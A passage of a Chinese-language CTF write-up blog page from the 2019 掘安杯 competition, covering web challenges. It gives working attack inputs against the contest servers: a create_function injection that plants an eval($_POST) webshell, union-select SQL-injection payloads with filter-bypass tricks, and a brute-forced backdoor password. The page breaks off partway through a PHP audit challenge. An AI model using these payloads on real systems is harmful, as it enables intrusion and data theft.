@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>2019掘安杯writeup | chuddy&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="chuddy's Blog">
+  
+  <meta name="description" content="writeup">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019掘安杯writeup">
+<meta property="og:url" content="http://yoursite.com/2019/04/10/掘安杯writeup/index.html">
+<meta property="og:site_name" content="chuddy&#39;s Blog">
+<meta property="og:description" content="writeup">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A4jPgA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A4juCQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A4j3D0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A4j7a8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A4vao8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A4vDzj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A5Qv4S.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A5lPun.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A530tf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/08/A5Un2V.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIdBJs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIsueP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIyN1H.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIy0Bt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIyy4S.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIcBY8.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIcylQ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIc2mn.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIoCjK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIokHe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIbxln.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIq9mV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIqPTU.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIzkbn.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/09/AIzVU0.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/10/ATetVf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/10/ATevzd.png">
+<meta property="og:updated_time" content="2019-04-10T08:09:04.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019掘安杯writeup">
+<meta name="twitter:description" content="writeup">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/08/A4jPgA.png">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  <script src="/js/pace.min.js"></script>
+  
+
+  
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+      <header id="header">
+    <div id="banner"></div>
+    <div id="header-outer">
+        <div id="header-menu" class="header-menu-pos animated">
+            <div class="header-menu-container">
+                <a href="/" class="left">
+                    <span class="site-title">chuddy&#39;s Blog</span>
+                </a>
+                <nav id="header-menu-nav" class="right">
+                    
+                    <a href="/">
+                        <i class="fa fa-home"></i>
+                        <span>Home</span>
+                    </a>
+                    
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>
+                        <span>Archives</span>
+                    </a>
+                    
+                    <a href="/about">
+                        <i class="fa fa-user"></i>
+                        <span>About</span>
+                    </a>
+                    
+                </nav>
+                <a class="mobile-header-menu-button">
+                    <i class="fa fa-bars"></i>
+                </a>
+            </div>
+        </div>
+        <div id="header-row">
+            <div id="logo">
+                <a href="/">
+                    <img src="/images/logo.png" alt="logo">
+                </a>
+            </div>
+            <div class="header-info">
+                <div id="header-title">
+                    
+                    <h2>
+                        chuddy&#39;s Blog
+                    </h2>
+                    
+                </div>
+                <div id="header-description">
+                    
+                </div>
+            </div>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a title="chuddy" target="_blank" href="//chuddyli.github.io">
+                            <i class="fa fa-home fa-2x"></i></a>
+                    
+                        <a title="Github" target="_blank" href="//github.com/chuddyli">
+                            <i class="fa fa-github fa-2x"></i></a>
+                    
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+      <div class="outer">
+        <section id="main" class="body-wrap"><article id="post-掘安杯writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="post-title" itemprop="name">
+      2019掘安杯writeup
+    </h1>
+    <div class="post-title-bar">
+      <ul>
+          
+              <li>
+                  <i class="fa fa-book"></i>
+                  
+                      <a href="/categories/writeup/">writeup</a>
+                  
+              </li>
+          
+        <li>
+          <i class="fa fa-calendar"></i>  2019-04-10
+        </li>
+        <li>
+          <i class="fa fa-eye"></i>
+          <span id="busuanzi_value_page_pv"></span>
+        </li>
+      </ul>
+    </div>
+  
+
+          
+      </header>
+    
+    <div class="article-entry post-content" itemprop="articleBody">
+      
+            
+            <h1 id="掘安杯writeup"><a href="#掘安杯writeup" class="headerlink" title="掘安杯writeup"></a>掘安杯writeup</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>打开题目链接发现</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4jPgA.png" alt="image"></p>
+<p>点击之后是一个404页面</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4juCQ.png" alt="image"></p>
+<p>果断选择抓包 发现：</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4j3D0.png" alt="image"></p>
+<p>感觉像是base64编码 于是解码获得flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;jasafe110qweasdzxc&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h3><p>打开链接发现下载了一个flag.txt  </p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4j7a8.png" alt="image"></p>
+<p>于是开始思考别的 查看源代码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;下载下载&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=&quot;?file=flag.txt&quot;&gt;下载flag文件&lt;/a&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">&lt;a href=&quot;flag.php&quot;&gt;flag&lt;/a&gt;</span><br><span class="line">--&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>于是尝试下载flag.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.1.69:10002/?file=flag.php</span><br></pre></td></tr></table></figure></p>
+<p>flag.php的内容为一种加密解密的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;Content-Type: text/html; charset=utf-8&apos;); //网页编码</span><br><span class="line">function encrypt($data, $key) &#123;</span><br><span class="line">	$key = md5 ( $key );</span><br><span class="line">	$x = 0;</span><br><span class="line">	$len = strlen ( $data );</span><br><span class="line">	$l = strlen ( $key );</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		if ($x == $l) &#123;</span><br><span class="line">			$x = 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= $key &#123;$x&#125;;</span><br><span class="line">		$x ++;</span><br><span class="line">	&#125;</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		$str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % 256 );</span><br><span class="line">	&#125;</span><br><span class="line">	return base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function decrypt($data, $key) &#123;</span><br><span class="line">	$key = md5 ( $key );</span><br><span class="line">	$x = 0;</span><br><span class="line">	$data = base64_decode ( $data );</span><br><span class="line">	$len = strlen ( $data );</span><br><span class="line">	$l = strlen ( $key );</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		if ($x == $l) &#123;</span><br><span class="line">			$x = 0;</span><br><span class="line">		&#125;</span><br><span class="line">		$char .= substr ( $key, $x, 1 );</span><br><span class="line">		$x ++;</span><br><span class="line">	&#125;</span><br><span class="line">	for($i = 0; $i &lt; $len; $i ++) &#123;</span><br><span class="line">		if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) &#123;</span><br><span class="line">			$str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			$str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=&quot;MyCTF&quot;;</span><br><span class="line">$flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>只需在代码下面添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo decrypt($flag,$key);</span><br></pre></td></tr></table></figure></p>
+<p>运行就可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myCTF&#123;cssohw456954GUEB&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="猜密码"><a href="#猜密码" class="headerlink" title="猜密码"></a>猜密码</h3><p>题目暂时下架了</p>
+<h3 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h3><p>打开页面发现网站被黑</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4vao8.png" alt="image"></p>
+<p>于是用御剑扫到后门 shell.php</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A4vDzj.png" alt="image"></p>
+<p>开始爆破管理员密码为  hack<br>即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;DWDASFASCASFAFASFNKAS&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h3><p>发现是个代码审计类的题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&apos;action&apos;])) &#123;</span><br><span class="line">    $action = $_GET[&apos;action&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;action&apos;]))&#123;</span><br><span class="line">    $arg = $_GET[&apos;arg&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action($arg,&apos;&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>想到了匿名函数绕过 但是他这里有一个正则匹配的问题</p>
+<p>看了别人的blog才知道  \可以绕过这个</p>
+<p>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+<p>于是想到绕过方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.1.69:10006/?action=\create_function&amp;arg=)&#123;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A5Qv4S.png" alt="image"></p>
+<p>于是可以构造一个木马：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.1.69:10006/?action=\create_function&amp;arg=)&#123;&#125;eval($_POST[&apos;chuddy&apos;]);/*</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A5lPun.png" alt="image"></p>
+<p>就可以得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jactf&#123;c795359da56ae38ec9132eaad24733fc&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h3><p>打开页面发现了登陆框 发现可以联合注入</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A530tf.png" alt="image"></p>
+<p>通过测试发现过滤了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格：用/*1*/绕过</span><br><span class="line">union：双写绕过ununionion</span><br><span class="line">select: 双写绕过selselctect</span><br><span class="line">or：双写绕过oorr</span><br></pre></td></tr></table></figure></p>
+<p>于是开始爆值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆出username：goodboy_g-60Hellowor  登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过</span><br><span class="line">admin&apos;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(username)/*1*/from/*1*/admin),3&apos;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆出password为  ajahas&amp;&amp;*44askldajaj</span><br><span class="line">admin&apos;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(passwoorrd)/*1*/from/*1*/admin),3&apos;#</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是下面验证码的问题 需要用脚本来跑<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&quot;utf8&quot;)</span><br><span class="line">data=&#123;</span><br><span class="line">	&apos;username&apos;:&apos;goodboy_g-60Hellowoorr&apos;,</span><br><span class="line">	&apos;password&apos;:&apos;ajahas&amp;&amp;*44askldajaj&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(100000000):</span><br><span class="line">	s = requests.Session()</span><br><span class="line">	url=&quot;http://120.79.1.69:10005/index.php&quot;</span><br><span class="line">	r = s.post(url=url,data=data)</span><br><span class="line">	match = re.search(r&quot;&lt;div class=&apos;rep&apos;&gt;.*&lt;/div&gt;&quot;,r.text).group(0)</span><br><span class="line">	match = str(match)</span><br><span class="line">	match = re.sub(&quot;&lt;div class=&apos;rep&apos;&gt;&quot;,&apos;&apos;,match)</span><br><span class="line">	match = re.sub(&quot;&lt;/div&gt;        &lt;/div&gt;&quot;,&apos;&apos;,match)</span><br><span class="line">	match = re.sub(&quot;（&quot;,&apos;(&apos;,match)</span><br><span class="line">	match = re.sub(&quot;）X&quot;,&apos;)*&apos;,match)</span><br><span class="line">	match = re.sub(&quot;）/&quot;,&apos;)/&apos;,match)</span><br><span class="line">	match = re.sub(&quot;）&quot;,&apos;)&apos;,match)</span><br><span class="line">	match = eval(match)</span><br><span class="line">	print match</span><br><span class="line">	d = &#123;</span><br><span class="line">		&apos;username&apos;:&apos;goodboy_g-60Hellowoorr&apos;,</span><br><span class="line">		&apos;password&apos;:&apos;ajahas&amp;&amp;*44askldajaj&apos;,</span><br><span class="line">	    &quot;code&quot;: match</span><br><span class="line">	&#125;</span><br><span class="line">	r = s.post(url=url+&quot;?check&quot;,data=d)</span><br><span class="line">	if &quot;验证码正确&quot; in r.text:</span><br><span class="line">		print r.text</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>
+<p>跑出来了一个压缩包地址  和密码：</p>
+<p><img src="https://s2.ax1x.com/2019/04/08/A5Un2V.png" alt="image"></p>
+<p>这里面有获取flag.zip的密码获取方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Private Function getPassword(ByVal str As String) As String</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Dim reString As String</span><br><span class="line">    </span><br><span class="line">    Dim i As Integer</span><br><span class="line">    i = 1</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    While (i &lt;= Len(str))</span><br><span class="line">    </span><br><span class="line">     reString = reString &amp; Mid(str, i, 1)</span><br><span class="line">     i = i + (i Mod 5)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Wend</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    getPassword = reString</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Private Sub Command1_Click()</span><br><span class="line"></span><br><span class="line">   Dim Dictionary As String</span><br><span class="line">    </span><br><span class="line">   Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">   </span><br><span class="line">   Dim password As String</span><br><span class="line">   </span><br><span class="line">   password = getPassword(Dictionary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Dim psw As String</span><br><span class="line">   </span><br><span class="line">   psw = Text1.Text</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   If (psw = password) Then</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot;</span><br><span class="line">    </span><br><span class="line">    Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password)</span><br><span class="line">       </span><br><span class="line">   Else</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">   End If</span><br><span class="line">   </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></p>
+<p>写出解密脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU&quot;</span><br><span class="line">print len(str)</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">flag1 = &quot;&quot;</span><br><span class="line">i =1</span><br><span class="line">while i &lt;= len(str):</span><br><span class="line">	flag += str[i-1:i]</span><br><span class="line">	i = i + (i%5)</span><br><span class="line"></span><br><span class="line">i=1</span><br><span class="line">while i &lt;= len(flag):</span><br><span class="line">	flag1 += flag[i-1:i]</span><br><span class="line">	i = i + (i%5)</span><br><span class="line">print flag1</span><br></pre></td></tr></table></figure></p>
+<p>密码为：<br>VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</p>
+<p>解压缩flag.zip之后发现图片打不开，用winhex打开发现flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Good luck!&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h3><p>发现是代码审计<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$str1 = @$_GET[&apos;str1&apos;];</span><br><span class="line">$str2 = @$_GET[&apos;str2&apos;];</span><br><span class="line">$str3 = @$_GET[&apos;str3&apos;];</span><br><span class="line">$str4 = @$_GET[&apos;str4&apos;];</span><br><span class="line">$str5 = (string)@$_POST[&apos;str5&apos;];</span><br><span class="line">$str6 = (string)@$_POST[&apos;str6&apos;];</span><br><span class="line">$str7 = (string)@$_POST[&apos;str7&apos;];</span><br><span class="line">if( $str1 == $str2 )&#123;</span><br><span class="line">    die(&apos;str1 OR Sstr2 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    die(&apos;step 1 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str3 == $str4 )&#123;</span><br><span class="line">    die(&apos;str3 OR str4 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    die(&apos;step 2 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str5 == $str6 || $str5 == $str7 || 